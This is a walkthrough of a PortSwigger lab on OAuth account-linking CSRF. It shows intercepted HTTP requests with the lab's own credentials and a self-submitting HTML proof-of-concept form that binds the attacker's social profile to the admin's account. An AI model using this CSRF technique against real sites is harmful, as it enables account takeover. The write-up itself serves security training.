## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b27eec88-6295-4475-b757-2150fd794978)

## Solution :

So as per the lab desc, we have these 2 information

- Blog website account: `wiener:peter`
- Social media profile: `peter.wiener:hotdog`
- The admin user will open anything we send from the exploit server and they always have an active session on the blog website.

### Recon 

The login page has an option to login via traditional username:password & also an option to login via social media !

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/a639c66d-b2e1-43b0-b2eb-94067b4f73f0)

First login as wiener, we have this option to attach our social media handle.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/4f2274ce-7171-4538-93b8-1a1154b4540d)

On clicking **Attach a social profile**, the client application sends a *Authoriation request* to the Oauth identity provider.

```http
GET /auth?client_id=zd0z0mcs05h6xy1izs6qs&redirect_uri=https://0a2600ea040904c4826f158800f4006c.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0acb00670438047f820f135d028000c6.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://0a2600ea040904c4826f158800f4006c.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
```
> Note that this Oauth flow to add social media **does not contain any `state=` parameter. So this is vulnerable to CSRF attacks**

Now the Oauth service redirects us to the social media login page & asks us for username and password.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/09eea3bc-0ac7-417f-9806-17092344680a)

The request sent is as follows,

```http
POST /interaction/h_HZHJFwu5SNlmERnvvAu/login HTTP/1.1
Host: oauth-0afa007604f736b180a029a002b300ad.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://oauth-0afa007604f736b180a029a002b300ad.oauth-server.net
Connection: close
Referer: https://oauth-0afa007604f736b180a029a002b300ad.oauth-server.net/interaction/h_HZHJFwu5SNlmERnvvAu/login
Cookie: _interaction=h_HZHJFwu5SNlmERnvvAu
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

username=peter.wiener&password=hotdog
```
Now it asks for our consent to accept the information that will be used.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b0338393-521a-4008-9b4b-ac304ca13104)

The next follow-up *GET* request to **/oauth-linking** contains the `?code=` parameter which contains the **Authorization token**.

```http
GET /oauth-linking?code=eWEB9aYNxO0Ls88fGmWdu1vQEG_JsniFHJ4kvpIRf2f HTTP/1.1
Host: 0a2600ea040904c4826f158800f4006c.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2600ea040904c4826f158800f4006c.web-security-academy.net/
Connection: close
Cookie: session=Z5diXRZYGorFvLSQFaLVfzZdRHtnzitH
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
```
Once the flow is over, we have added our social media account & now we can login to our account via social media.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b5d393c5-c4ef-41a6-ac7a-7eba442d9716)

### Exploitation 

Since the Oauth flow for adding social media to our account **doesn't have any `state=` parameter, we can perform a csrf attack to link somebody else's social media to our account.**

Then we can login to our account via social media & we would have logged in to the victim's account who clicked our CSRF POC script.

#### Steps -

1. Login as wiener.
2. Click add social media option & intercept the request flow.
3. Intercept the request after entering consent to permissions that were required. A *GET* request to `/oauth-linking?code=<value>` is sent. Drop the particular request so that the code is fresh and not used by wiener.
4. Create a CSRF POC for the request containing the authorization code.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a81007904223666800f2b9b00a500ae.web-security-academy.net/oauth-linking">
      <input type="hidden" name="code" value="n4hzKYNoh4upso6bDZys&#95;fjVFI6zf&#45;MURAjNHLutcrP" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

5. Send the exploit to admin via the exploit server.
6. Now logout and login via **Login with social media** option.

We have now successfullt logged in as **administrator**

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/889d7f6a-3b09-403c-981b-093dd1abb833)

Click on the admin panel and delete the user carlos to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/c66f51c2-c321-45dc-9f76-c8f0d60ebe72)
